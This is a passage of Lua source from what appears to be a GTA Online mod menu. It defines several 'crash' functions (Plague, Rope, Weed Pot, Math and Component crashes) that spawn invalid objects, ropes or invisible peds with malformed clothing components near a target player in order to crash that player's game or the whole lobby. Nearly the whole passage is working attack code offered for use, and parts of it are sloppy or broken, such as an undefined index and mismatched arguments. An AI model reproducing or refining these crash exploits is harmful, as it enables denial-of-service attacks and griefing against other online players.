	end)

menu.toggle_loop(keramicrash, "Plague Crash Player", {"plaguecrash"}, "", function(on_loop)
    notification("Plague Crash Player sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    for i = 1, 10 do
        local cord = getEntityCoords(getPlayerPed(pid))
        request_model(-930879665)
        util.yield(10)
        request_model(3613262246)
        util.yield(10)
        request_model(452618762)
        util.yield(10)
        local a1 = entities.create_object(-930879665, cord)
        util.yield(10)
        local a2 = entities.create_object(3613262246, cord)
        util.yield(10)
        local b1 = entities.create_object(452618762, cord)
        util.yield(10)
        local b2 = entities.create_object(3613262246, cord)
        util.yield(300)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        request_model(452618762)
        util.yield(10)
        request_model(3613262246)
        util.yield(10)
        request_model(-930879665)
        util.yield(10)
        end
        if SE_Notifications then
            util.toast("Finished.")
	end
end)

menu.toggle_loop(keramicrash, "Rope Crash Lobby", {"ropecrash"}, "", function(on_loop)
    notification("Rope Crash Lobby sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = getEntityCoords(getPlayerPed(pid))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    local vehc = getEntityCoords(veh); local pedc = getEntityCoords(ped)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    entities.delete_by_handle(veh); entities.delete_by_handle(ped)
    PHYSICS.DELETE_CHILD_ROPE(rope)
    PHYSICS.ROPE_UNLOAD_TEXTURES()
    end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    local weedcrash = menu.list(Removals_List, "Weed Crash", {}, "")

    menu.action(weedcrash, "Weed Pot Crash", {"weedcrash"}, "", function()
        local cord = getEntityCoords(getPlayerPed(pid))
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        util.toast("Finished.")
    end)

    menu.toggle_loop(weedcrash, "Weed Pot Crash", {"toggleweedcrash"}, "", function(on_toggle)
        notification("Weed Pot Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        local cord = getEntityCoords(getPlayerPed(pid))
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
            return
        end
    end)

    local mathcrash = menu.list(Removals_List, "Math Crash", {}, "")

menu.action(mathcrash, "Math Crash Lobby", {"math"}, "One of the versions of rope crash.", function()
    notification("Math Crash Lobby sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    cargobob = entities.create_vehicle(2132890591, pos, 0)
    cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
end)

menu.toggle_loop(mathcrash, "Math Crash Lobby", {"togglemath"}, "One of the versions of rope crash.", function(on_toggle)
    notification("Math Crash Lobby sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    cargobob = entities.create_vehicle(2132890591, pos, 0)
    cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
                util.yield(100)
end)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local clothescrash = menu.list(Removals_List, "Component Crash", {}, "")

menu.toggle_loop(clothescrash, "Small Component Crash", {"smallclothescrash"}, "Warning! Toggle Panic Mode First!", function(on_toggle)
    notification("Small Component Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        local math_random = math.random
        local joaat = util.joaat
        util.yield(100)
        local pedhash = util.joaat("P_franklin_02")
        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
            STREAMING.REQUEST_MODEL(pedhash)
            util.yield(10)
        end
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
        SpawnedPeds1 = {}
        local ped_amount = math_random(7, 10)
        for i = 1, ped_amount do
            local pedtype = 0
            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
            local coords = PlayerPedCoords
            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
            coords.x = coords.x
            coords.y = coords.y
            coords.z = coords.z
            if loc1 == 1 then
                coords.x = coords.x - math_random(1, 5)
            else
                coords.x = coords.x + math_random(1, 5)
            end
            if loc2 == 1 then
                coords.y = coords.y - math_random(1, 5)
            else
                coords.y = coords.y + math_random(1, 5)
            end
            if loc3 == 1 then
                coords.z = coords.z - math_random(3, 5)
            else
                coords.z = coords.z + math_random(3, 5)
            end
            if pedt == 1 then
                pedtype = 0
            else
                pedtype = 3
            end
            SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
            util.yield(5)
        end
        for i = 1, ped_amount do
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
            util.yield()
        end
        util.yield(500)
        for i = 1, ped_amount do
            entities.delete(SpawnedPeds1[i])
            util.yield(5)
            end
    end)

menu.action(clothescrash, "Component Crash", {"clothescrash"}, "Warning! Toggle Panic Mode First!", function()
        if pid ~= players.user() then
            util.toast("Wait 20 Seconds...")
            local math_random = math.random
            local joaat = util.joaat
            util.yield(100)
            local pedhash = util.joaat("P_franklin_02")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds1 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds1[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_lazlow")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds2 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds2[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds2[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds2[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds2[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds2[i], 3, 0, 3, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds2[i])
                util.yield(5)
            end
            util.yield(5)
            local pedhash = util.joaat("cs_taocheng")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds3 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds3[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds3[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds3[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds3[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds3[i], 3, 2, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds3[i])
                util.yield(5)
            end
            util.yield(5)
            local pedhash = util.joaat("cs_solomon")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds4 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds4[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds4[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds4[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds4[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds4[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds4[i])
                util.yield(5)
            end
            util.yield(5)
            local pedhash = util.joaat("cs_stevehains")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds5 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds5[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds5[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds5[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds5[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds5[i], 3, 1, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds5[i])
                util.yield(5)
            end
            
            local pedhash = util.joaat("cs_taostranslator")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds6 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds6[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds6[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds6[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds6[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds6[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds6[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_debra")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds7 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds7[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds7[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds7[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds7[i], 4, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds7[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_devin")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds8 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds8[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds8[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds8[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds8[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds8[i], 3, 1, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds8[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_guadalope")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds9 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds9[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds9[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds9[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds9[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds9[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds9[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_gurk")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds10 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds10[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds10[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds10[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds10[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds10[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds10[i])
                util.yield(5)
            end
            
            local pedhash = util.joaat("cs_jimmydisanto")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds11 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
